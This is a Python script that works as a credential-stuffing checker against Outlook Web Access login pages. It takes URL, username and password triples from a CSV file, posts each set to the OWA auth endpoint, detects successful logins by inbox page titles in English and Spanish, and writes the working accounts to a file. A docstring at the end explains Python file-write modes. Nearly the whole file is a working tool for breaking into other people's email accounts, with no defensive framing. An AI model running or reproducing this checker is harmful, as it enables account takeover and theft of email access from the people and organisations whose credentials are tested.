
import requests
from bs4 import BeautifulSoup as bs
import csv 
import re 
import time
#latest1
hit=0
fail=0 
bobo=[]

def sendreq(url,values):
    try:
        response = requests.post(url, data=values)
        status=response.status_code
        print(status)
        open('owa3.html', 'wb').write(response.content)
        kuntent=response.text
        
    except Exception:
        return
    return status,kuntent

def valids():
    global hit
    global fail
    global bobo 
    if "<title>Bandeja de entrada - Outlook</title>" in rk[1]:
        print("Success")
        hit=hit+1
        omk='{}|{}|{}'.format(y,user,pas)
        print(omk)
        bobo.append(omk)
    elif "Inbox" in rk[1]:
        print("Success")
        hit=hit+1
        omk='{}|{}|{}'.format(y,user,pas)
        print(omk)
        bobo.append(omk)
    elif "The user name or password you entered isn't correct. Try entering it again" in rk[1]:
        print("Fail,something is wrong")
        fail=fail+1
    elif rk[0]==500:
        print("Too many attempts or internal error")
    elif "<title>Outlook</title>" in rk[1]:
        print("Fail,something is wrong")
        fail=fail+1
    else:
        fail=fail+1
    return hit,fail,bobo


    
    


with open('values.csv', newline='') as csvf:
    rr=csv.reader(csvf,delimiter='|')
    for rd in rr:
        y= rd[0]
        user=rd[1]
        pas=rd[2]
        print(rd[1])
        patt = r".*auth"
        mwe = re.findall(patt,y)
        for matches in mwe :
            matchesnew= matches+'.owa'
            matchesold= matches.replace('/auth', '')
            print(matchesnew)
            url = matchesnew
            values = {'destination': matchesold,
                      'flags' : '4',
                      'forcedownlevel' : '0',
                      'username': user,
                      'password': pas,
                      'passwordText': '',
                      'isUtf8': '1',}
            rk=sendreq(url,values)
            mk=valids()
            hit=mk[0]
            fail=mk[1]
            bobo=mk[2]




            
                
            
print('HIT-->',hit)
print('fails-->',fail)
print(bobo)
#open('hit.txt', 'w').write(str(mk[2]))
with open("file.txt", 'w') as output:
    for row in bobo:
        output.write(str(row) + '\n')
            


            


    
    
    
    
    
    
    
    
    
    


'''The wb indicates that the file is opened for writing in binary mode.

When writing in binary mode, Python makes no changes to data as it is written to the file. In text mode (when the b is excluded as in just w or when you specify text mode with wt), however, Python will encode the text based on the default text encoding. Additionally, Python will convert line endings (\n) to whatever the platform-specific line ending is, which would corrupt a binary file like an exe or png file.

Text mode should therefore be used when writing text files (whether using plain text or a text-based format like CSV), while binary mode must be used when writing non-text files like images.

References:

https://docs.python.org/3/tutorial/inputoutput.html#reading-and-writing-files 
https://docs.python.org/3/library/functions.html#open'''